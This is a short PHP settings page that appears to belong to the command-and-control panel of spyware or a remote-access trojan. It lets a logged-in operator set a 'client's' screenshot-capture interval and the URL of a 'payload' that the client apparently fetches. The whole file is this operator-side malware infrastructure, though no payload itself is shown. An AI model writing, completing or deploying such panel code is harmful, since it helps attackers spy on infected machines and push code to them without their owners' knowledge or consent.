<?php
require_once ('includes/functions.php');

$login = new Login();
$template = new Template();

if (!$login->loggedIn()) {
    $template->showLogin();
}

$id = $_GET["cid"];

if (isset($_POST["changeSettings"])) {
    
    $db->bindMore(array(
        "interval" => $_POST["interval"],
        "payload" => $_POST["payload"],
        "client_id" => $id,
    ));
    
    $db->query("UPDATE clients SET scr_cap_interval = :interval, payload_url = :payload WHERE client_id = :client_id");
    
    redirect("index", 3);
    $template->showMessage("Settings have been changed.", "Changed Settings");
}

$db->bind("client_id", $id);
$data = $db->row("SELECT * FROM clients WHERE client_id = :client_id ");

$template->showHeader("Dashboard");

$template->showSettings($data);

$template->showFooter();
?>